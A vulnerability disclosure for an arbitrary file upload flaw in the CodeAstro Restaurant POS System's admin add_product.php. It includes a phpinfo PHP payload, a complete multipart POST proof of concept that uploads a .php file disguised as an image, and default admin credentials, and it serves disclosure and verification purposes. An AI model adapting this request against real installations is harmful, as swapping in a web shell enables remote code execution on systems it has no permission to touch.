# Vulnerability Description

Arbitrary file upload vulnerability in [Restaurant POS System v1.0](https://codeastro.com/restaurant-pos-system-in-php-with-source-code/) allows attackers to execute arbitrary code via the file upload to add_product.php. It is an open source project from [https://codeastro.com](https://codeastro.com) .

1. Vulnerability Submitter: Tr0e
  
2. vendors: [Restaurant POS System in PHP with Source Code - CodeAstro](https://codeastro.com/restaurant-pos-system-in-php-with-source-code/)
  
3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version
  
4. Vulnerability location: /RestaurantPOS/Restro/admin/add_product.php
  

# Vulnerability Verification

[+] Payload:

```php
<?php phpinfo();?>
```

POC：

```js
POST http://192.168.0.120:91/RestaurantPOS/Restro/admin/add_product.php HTTP/1.1
Host: 192.168.0.120:91
Content-Length: 826
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.120:91
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySsF9wyDdPINlRtc6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.120:91/RestaurantPOS/Restro/admin/add_product.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=ldi7mdlvm8g7bnfhunuvrhp8ne
Connection: close

------WebKitFormBoundarySsF9wyDdPINlRtc6
Content-Disposition: form-data; name="prod_name"

Test
------WebKitFormBoundarySsF9wyDdPINlRtc6
Content-Disposition: form-data; name="prod_id"

f867c0fe4f
------WebKitFormBoundarySsF9wyDdPINlRtc6
Content-Disposition: form-data; name="prod_code"

RFZN-9372
------WebKitFormBoundarySsF9wyDdPINlRtc6
Content-Disposition: form-data; name="prod_img"; filename="Tr0e.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarySsF9wyDdPINlRtc6
Content-Disposition: form-data; name="prod_price"

100
------WebKitFormBoundarySsF9wyDdPINlRtc6
Content-Disposition: form-data; name="prod_desc"

Tr0e Test
------WebKitFormBoundarySsF9wyDdPINlRtc6
Content-Disposition: form-data; name="addProduct"

Add Product
------WebKitFormBoundarySsF9wyDdPINlRtc6--
```

## How to verify

1. Build the vulnerability environment according to the steps provided by the source code author.  
2. log in to the "Admin Panel” through the default account and password（Email: [admin@mail.com](mailto:admin@mail.com) Password: codeastro.com）;  
3. The vulnerability lies in the "Products - Add New Product" function, you should inserts Payload when you add new product, as shown in the following figure：

![image](https://user-images.githubusercontent.com/42080954/194765930-53f0d7a4-975a-48a6-925e-1151b7dacd26.png)
![image](https://user-images.githubusercontent.com/42080954/194765967-712c3ece-dc12-4a3a-a4c4-b5cdd781d80b.png)
![image](https://user-images.githubusercontent.com/42080954/194766003-d6d98922-af0f-428e-9846-c11ed49931c3.png)
